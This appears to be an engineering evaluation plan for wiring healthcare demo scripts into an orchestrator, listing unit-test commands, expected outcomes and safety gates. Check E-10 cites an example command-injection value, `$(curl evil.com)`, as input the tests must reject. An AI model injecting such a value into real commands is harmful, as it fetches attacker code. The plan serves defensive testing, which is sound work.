# 012: Orchestrator Add-on Wiring for Healthcare Demonstration Capabilities: Evaluation

## Setup
1. Python interpreter for running orchestrator unit tests:
   `/Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python`
2. Workspace directory:
   `/Users/joey/git/.worktrees/hls-fabric-wow/orchestrator`

## Automated checks
- **A-1**: All orchestrator unit tests pass including the new wiring tests:
  ```bash
  cd /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator && \
    /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest discover -s tests -p 'test_*.py'
  ```
  Must exit with status 0.
- **A-2**: Front-end build continues to compile cleanly:
  ```bash
  cd /Users/joey/git/.worktrees/hls-fabric-wow/rayfin-imaging && ./node_modules/.bin/tsc -b
  ```
  Must exit with status 0.

## Acceptance checks

### E-1 [U]: Default configuration runs the safe demo steps and never the identity step (covers FR-1, FR-7, S)
- **Type**: CLI
- **Steps**:
  1. Execute unit test asserting default config execution:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py -k test_demo_step_defaults
     ```
- **Expected**:
  - Test passes.
  - With all four flags omitted and `alert_email` empty: `synthea/seed_tcga_cohort.py apply` runs once in `prepare_rayfin_imaging`; `09-onelake-interop-proof.py` runs once in `databricks`; `manage_researcher_persona.py`, `deploy_clinical_activator.py` and `trigger_spo2_alert.py` run zero times, and a substep reports `skipped: no alert_email configured`.

### E-2 [U]: Enabling seed_tcga_cohort invokes synthea/seed_tcga_cohort.py apply in correct sequence (covers FR-1, FR-2, FR-7)
- **Type**: CLI
- **Steps**:
  1. Execute unit test asserting TCGA cohort seeding execution:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py -k test_seed_tcga_cohort_invoked_in_sequence
     ```
- **Expected**:
  - Test passes.
  - Subprocess command `[sys.executable, ".../synthea/seed_tcga_cohort.py", "apply", "--resource-group", ..., "--subscription", ...]` is executed immediately following `pipeline/seed_patient360_silos.py`.
  - Substep title `"rayfin-imaging: seed TCGA synthetic FHIR cohort"` is recorded with status `"succeeded"`.

### E-3 [U]: Enabling enable_researcher_persona invokes persona management and deidentified seeding (covers FR-1, FR-2, FR-7)
- **Type**: CLI
- **Steps**:
  1. Execute unit test asserting researcher persona wiring:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py -k test_researcher_persona_invoked_in_sequence
     ```
- **Expected**:
  - Test passes.
  - Commands `[sys.executable, ".../scripts/manage_researcher_persona.py", "--create", ...]` and `[sys.executable, ".../pipeline/seed_deidentified_clinical.py"]` are invoked in order.
  - Substeps `"rayfin-imaging: manage researcher persona"` and `"rayfin-imaging: seed de-identified clinical silo"` transition to `"succeeded"`.

### E-4 [U]: Enabling enable_alert_stopwatch deploys activator reflex and runs stopwatch trigger (covers FR-1, FR-2, FR-7)
- **Type**: CLI
- **Steps**:
  1. Execute unit test asserting alert stopwatch wiring:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py -k test_alert_stopwatch_invoked_in_sequence
     ```
- **Expected**:
  - Test passes.
  - Commands `[sys.executable, ".../scripts/deploy_clinical_activator.py", ...]` and `[sys.executable, ".../scripts/trigger_spo2_alert.py", "--live", ...]` are invoked in sequence.
  - Substeps `"rayfin-imaging: deploy clinical activator reflex"` and `"rayfin-imaging: trigger SpO2 alert stopwatch"` transition to `"succeeded"`.

### E-5 [U]: Enabling verify_databricks_interop executes interop proof in Databricks add-on (covers FR-1, FR-3, FR-7)
- **Type**: CLI
- **Steps**:
  1. Execute unit test asserting Databricks interop wiring:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py -k test_databricks_interop_invoked_in_sequence
     ```
- **Expected**:
  - Test passes.
  - Command `[sys.executable, ".../azure-databricks/implementation/scripts/09-onelake-interop-proof.py", "--live", ...]` is invoked after Unity Catalog metastore and OneLake Databricks storage setup.
  - Substep `"databricks: verify OneLake Unity Catalog interop"` transitions to `"succeeded"`.

### E-6 [F]: Subprocess failure in any wired demonstration script is surfaced and unswallowed (covers FR-4, FR-5)
- **Type**: CLI
- **Steps**:
  1. Execute unit test simulating non-zero exit code from `seed_tcga_cohort.py`:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py -k test_demo_step_failure_is_not_swallowed
     ```
- **Expected**:
  - Test passes.
  - Non-zero subprocess exit code raises `RuntimeError` containing the script name and error message.
  - Substep status is updated to `"failed"`.
  - Deployment does not falsely report overall success.

### E-7 [F]: Idempotent re-run of wired demonstration steps succeeds (covers FR-2, FR-3)
- **Type**: CLI
- **Steps**:
  1. Run unit test asserting two consecutive executions of `prepare_rayfin_imaging` with all flags enabled:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py -k test_idempotent_rerun_succeeds
     ```
- **Expected**:
  - Both runs complete cleanly without errors or duplicate state exceptions.

### E-8 [R]: Core rayfin, cardiology, and databricks add-ons function unchanged when wow flags are off (covers R)
- **Type**: CLI
- **Steps**:
  1. Run the full existing `test_addons.py` suite:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py
     ```
- **Expected**:
  - All pre-existing test cases (`AddonContractTests`, `FreshDatabricksExportTests`, `BundlePreparationTests`) pass with zero regressions.

### E-9 [Q]: Selection and preflight execution speed remains under 500 ms (covers NFR-1)
- **Type**: CLI
- **Steps**:
  1. Benchmark `selected()` and `preflight()` execution:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -c '
     import sys, time
     sys.path.insert(0, "/Users/joey/git/.worktrees/hls-fabric-wow/orchestrator")
     from activities import addons
     t0 = time.monotonic()
     for _ in range(100):
         addons.selected({"deploy_rayfin_apps": True, "seed_tcga_cohort": True})
     assert (time.monotonic() - t0) < 0.5
     print("Selection benchmark passed")
     '
     ```
- **Expected**:
  - Benchmark completes in under 500 ms.

### E-10 [S]: Attack test: Command injection via configuration parameters is strictly rejected (covers NFR-2, S)
- **Type**: CLI
- **Steps**:
  1. Execute unit test attempting shell command injection in workspace or resource group name parameters:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py -k test_command_injection_rejected
     ```
- **Expected**:
  - Test passes.
  - Subprocess arguments are passed as discrete token arrays (`create_subprocess_exec` without `shell=True`), preventing parameter injection or execution of malicious subcommands (e.g. `$(curl evil.com)`).

### E-11 [S]: Identity creation safety gate: Entra user creation is opt-in only (covers FR-1, S)
- **Type**: CLI
- **Steps**:
  1. Execute unit test verifying that `manage_researcher_persona.py` is never called without explicit `enable_researcher_persona: True`:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py -k test_identity_creation_blocked_by_default
     ```
- **Expected**:
  - Test passes.
  - Invocations of `manage_researcher_persona.py` count is strictly 0 when `enable_researcher_persona` is omitted, `False`, or a truthy non-boolean string such as `"false"`.

### E-12 [S]: Email notification safety gate: alert steps run only with a configured alert_email, and the address is never logged (covers FR-1, FR-7, S)
- **Type**: CLI
- **Steps**:
  1. Execute unit test verifying the alert gate and log hygiene:
     ```bash
     /Users/joey/git/.worktrees/hls-auth-refresh/orchestrator/.venv/bin/python -m unittest \
       /Users/joey/git/.worktrees/hls-fabric-wow/orchestrator/tests/test_addons.py -k test_email_dispatch_requires_alert_email
     ```
- **Expected**:
  - Test passes.
  - With `alert_email` empty or missing, `deploy_clinical_activator.py` and `trigger_spo2_alert.py` run 0 times.
  - With `alert_email` = `nurse@hospital.example` and `enable_alert_stopwatch` omitted, both run once, in that order, with `HLS_ALERT_EMAIL=nurse@hospital.example` in the subprocess environment.
  - With `enable_alert_stopwatch: False`, both run 0 times even when `alert_email` is set.
  - The address does not appear in any argument list or substep title the test captures.

## Edge case checks
### E-13 [F]: Missing CLI script file surfaces actionable FileNotFoundError (covers Edge cases)
- **Type**: CLI
- **Steps**:
  1. Execute test where one of the wired CLI script paths does not exist on disk.
- **Expected**:
  - Substep records error status with clear message indicating missing script file.

## Regression checks
- Pre-existing add-on phases (`deploy_cardiology`, `deploy_rayfin_apps`, `deploy_databricks`) continue to execute their existing commands in exact baseline sequence when demonstration flags are unselected.

## Traceability
| Requirement | Evals |
|-------------|-------|
| FR-1        | E-1, E-11, E-12 |
| FR-2        | E-2, E-3, E-4 |
| FR-3        | E-5   |
| FR-4        | E-6   |
| FR-5        | E-2, E-3, E-4, E-5, E-6 |
| FR-6        | E-4   |
| FR-7        | E-1 through E-12 |
| NFR-1       | E-1   |
| NFR-2       | E-10  |
| NFR-3       | E-6   |

## Not covered
- **Design (D) / Browser UI**: This ticket deals exclusively with orchestrator backend Python automation and CLI invocation; no React UI components or browser interfaces are modified.
- **Direct SMTP email delivery**: The orchestrator delegates alerting to the Fabric Activator service rather than running a direct mail transfer agent.

## Definition of done
- [ ] All automated checks pass (`A-1`, `A-2`).
- [ ] All acceptance checks (`E-1` through `E-12`) pass, including all 3 Security attack and safety gate checks (`E-10`, `E-11`, `E-12`).
- [ ] Edge case check `E-13` passes.
- [ ] No items from "Out of scope" were built.
